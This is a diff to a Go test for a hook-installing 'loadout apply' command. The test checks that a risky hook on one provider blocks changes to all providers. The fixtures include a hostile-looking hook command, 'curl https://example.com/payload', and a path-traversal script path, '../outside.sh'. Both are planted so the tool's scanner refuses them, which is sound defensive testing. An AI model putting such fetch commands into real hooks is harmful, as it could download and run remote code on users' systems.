@@ -1362,10 +1362,11 @@ func TestRunLoadoutApply_HighFindingHookNeedsForce(t *testing.T) {
 // provider changes, so the retry starts from a clean state.
 func TestRunLoadoutApply_MultiProviderRefusalChangesNoProvider(t *testing.T) {
 	for _, tc := range []struct {
-		name, command, want string
+		name, event, command, want string
 	}{
-		{"scanner finding", "curl https://example.com/payload", "--force"},
-		{"script outside the item", "../outside.sh", "outside item directory"},
+		{"scanner finding", "after_tool_execute", "curl https://example.com/payload", "--force"},
+		{"script outside the item", "after_tool_execute", "../outside.sh", "outside item directory"},
+		{"unknown event", "Bogus", "echo ok", "unknown hook event"},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
 			root := setupLoadoutApplyRepo(t, "", "", nil)
@@ -1378,13 +1379,13 @@ func TestRunLoadoutApply_MultiProviderRefusalChangesNoProvider(t *testing.T) {
 			os.MkdirAll(loDir, 0755)
 			os.WriteFile(filepath.Join(loDir, "loadout.yaml"), []byte("kind: loadout\nversion: 1\nname: both\ndescription: test loadout\nproviders:\n  - claude-code\n  - gemini-cli\nhooks:\n  - fetcher\n"), 0644)
 			os.WriteFile(filepath.Join(root, "hooks", "outside.sh"), []byte("#!/bin/sh\n"), 0755)
-			for slug, command := range map[string]string{
-				"claude-code": "echo done",
-				"gemini-cli":  tc.command,
+			for slug, hook := range map[string][2]string{
+				"claude-code": {"after_tool_execute", "echo done"},
+				"gemini-cli":  {tc.event, tc.command},
 			} {
 				hookDir := filepath.Join(root, "hooks", slug, "fetcher")
 				os.MkdirAll(hookDir, 0755)
-				os.WriteFile(filepath.Join(hookDir, "hook.json"), []byte(`{"spec":"hooks/0.1","hooks":[{"event":"after_tool_execute","handler":{"type":"command","command":"`+command+`"}}]}`), 0644)
+				os.WriteFile(filepath.Join(hookDir, "hook.json"), []byte(`{"spec":"hooks/0.1","hooks":[{"event":"`+hook[0]+`","handler":{"type":"command","command":"`+hook[1]+`"}}]}`), 0644)
 			}
 			output.SetForTest(t)
 			loadoutApplyCmd.Flags().Set("keep", "true")
